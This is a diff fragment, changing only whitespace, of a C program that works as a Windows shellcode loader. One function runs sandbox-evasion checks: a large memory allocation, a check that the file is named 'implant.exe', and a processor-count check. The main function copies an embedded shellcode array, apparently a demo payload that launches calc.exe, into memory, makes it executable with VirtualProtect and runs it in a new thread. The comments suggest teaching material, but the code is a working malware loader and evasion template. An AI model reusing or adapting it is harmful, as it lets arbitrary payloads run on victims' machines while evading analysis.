@@ -10,7 +10,7 @@ int checkMe(){
 
 	//set up system structures, these will contain system data
 	SYSTEM_INFO s;
-	MEMORYSTATUSEX ms;	
+	MEMORYSTATUSEX ms;
 	DWORD procNum;
 
 	unsigned char lpFileName[200];
@@ -25,14 +25,14 @@ int checkMe(){
 	char * mem = NULL;
 	mem = (char *) malloc (6900000);
 
-	
+
 	if(mem == NULL){
 		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
 		return -1;
 	}
 
 	memset(mem,69,6900000);
-	
+
 	//check if my name is not implant.exe
 	while(token != NULL){
 		last = token;
@@ -40,12 +40,12 @@ int checkMe(){
 	}
 	result = strcmp(strlwr(last),"implant.exe");
 
-	
+
 	if(result != NULL){
 		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
 		return -1;
 	}
-	
+
 	//get number of processors, we expect 4
 	GetSystemInfo(&s);
 	procNum = s.dwNumberOfProcessors;
@@ -56,7 +56,7 @@ int checkMe(){
 	}
 
 	free(mem);
-		
+
 	return 0;
 }
 
@@ -95,27 +95,27 @@ int main(void) {
 		0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
 		};
 		//Get size of our payload, we'll need this later
-		unsigned int payload_len = sizeof(payload); 
-		
+		unsigned int payload_len = sizeof(payload);
+
 		//allocate a place to write our code in memory, we only need READ/WRITE permissions
 		exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		
+
 		//copy our payload to the place we just allocated
 		RtlMoveMemory(exec_mem, payload, payload_len);
-		
+
 		//We need EXECUTE/READ permissions now so that our payload can be executed
 		rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
-		
+
 		//If we successfully changed the permissions at the address our payload has been written to, try to make a new thread (execute the payload)
 		if (rv != 0) {
-			
+
 			//execute the payload
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
-			
+
 			//wait for payload to terminate
 			WaitForSingleObject(th, -1);
 		}
-		
+
 		//clean up
 		CloseHandle(th);
 	}
